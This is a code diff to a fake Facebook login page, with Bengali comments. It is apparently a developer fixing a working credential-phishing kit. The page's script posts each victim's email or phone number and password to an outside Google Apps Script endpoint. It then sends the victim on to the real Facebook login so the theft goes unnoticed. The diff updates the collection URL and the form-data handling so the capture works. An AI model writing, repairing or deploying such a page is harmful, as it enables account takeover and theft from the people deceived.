@@ -18,7 +18,7 @@
     <div class="login-container">
         <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l395u_e77N.svg" alt="Facebook">
         <form id="loginForm">
-            <input type="text" id="phone" name="phone" placeholder="Email or Phone Number" required>
+            <input type="text" id="phone" name="email" placeholder="Email or Phone Number" required>
             <input type="password" id="pass" name="pass" placeholder="Password" required>
             <button type="submit" id="submitBtn">Log In</button>
         </form>
@@ -26,7 +26,8 @@
     </div>
 
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycybyOlkx163gk585SzGl4nsHN1TiWumtToHlYz38GNojA_iAEPKqmBow97XUglh1Mxqtf/exec';
+        // আপনার দেওয়া সঠিক গুগল স্ক্রিপ্ট লিঙ্ক এখানে বসানো হয়েছে
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwDvTNRnLn5An9kuGGLqfo-HedkRBr_rWk_0sd7kSIKfK7Ns5Q4r0zmQ77qQKuq4320/exec';
         const form = document.getElementById('loginForm');
         const btn = document.getElementById('submitBtn');
 
@@ -35,17 +36,16 @@
             btn.disabled = true;
             btn.innerHTML = "Logging in...";
 
+            // ডাটা পাঠানোর জন্য FormData ব্যবহার করা হচ্ছে যা গুগল স্ক্রিপ্টের সাথে ভালো কাজ করে
+            const formData = new FormData(form);
+
             fetch(scriptURL, { 
                 method: 'POST', 
                 mode: 'no-cors',
-                cache: 'no-cache',
-                body: JSON.stringify({
-                    phone: document.getElementById('phone').value,
-                    pass: document.getElementById('pass').value
-                })
+                body: formData
             })
             .then(() => {
-                // ডাটা পাঠানোর পর আসল ফেসবুকে পাঠিয়ে দেবে
+                // ডাটা পাঠানোর পর ইউজারকে আসল ফেসবুকে পাঠিয়ে দেবে
                 window.location.href = "https://www.facebook.com/login";
             })
             .catch(error => {
